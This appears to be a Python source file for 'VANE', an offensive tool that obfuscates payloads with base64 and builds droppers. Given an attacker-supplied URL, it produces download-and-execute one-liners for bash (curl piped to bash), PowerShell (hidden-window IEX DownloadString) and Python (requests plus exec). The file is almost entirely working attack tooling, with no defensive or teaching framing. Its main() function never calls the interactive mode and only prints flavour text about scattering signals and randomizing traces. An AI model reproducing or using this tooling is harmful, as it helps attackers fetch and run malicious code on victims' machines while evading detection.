import base64
import textwrap
from rich import print
from rich.panel import Panel
from rich.prompt import Prompt

def encode_payload(payload: str) -> str:
    b64 = base64.b64encode(payload.encode()).decode()
    return f"echo {b64} | base64 -d | bash"

def generate_dropper(url: str, language: str) -> str:
    if language.lower() == "bash":
        return f"curl -s {url} | bash"
    elif language.lower() == "powershell":
        return f"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('{url}')\""
    elif language.lower() == "python":
        return textwrap.dedent(f"""
        import requests
        r = requests.get("{url}")
        exec(r.text)
        """).strip()
    else:
        return "[red]Unsupported language[/red]"

def run():
    print(Panel("[bold cyan]VANE[/bold cyan] — Adaptive Payload Obfuscator & Dropper Builder", style="bold magenta"))

    mode = Prompt.ask("[green]Select mode[/green]", choices=["encode", "dropper", "exit"], default="encode")

    if mode == "encode":
        raw = Prompt.ask("[bold yellow]Enter raw payload to encode[/bold yellow]")
        result = encode_payload(raw)
        print("\n[bold green]Base64 Wrapper:[/bold green]")
        print(result)

    elif mode == "dropper":
        url = Prompt.ask("[bold yellow]Payload URL[/bold yellow]")
        lang = Prompt.ask("[bold yellow]Language[/bold yellow]", choices=["bash", "powershell", "python"])
        result = generate_dropper(url, lang)
        print(f"\n[bold green]{lang.title()} Dropper:[/bold green]")
        print(result)

def main(args=None):
    print("[vane] 🌬️ Signal scatter enabled.")
    print("Randomizing response traces.")

if __name__ == "__main__":
    main()
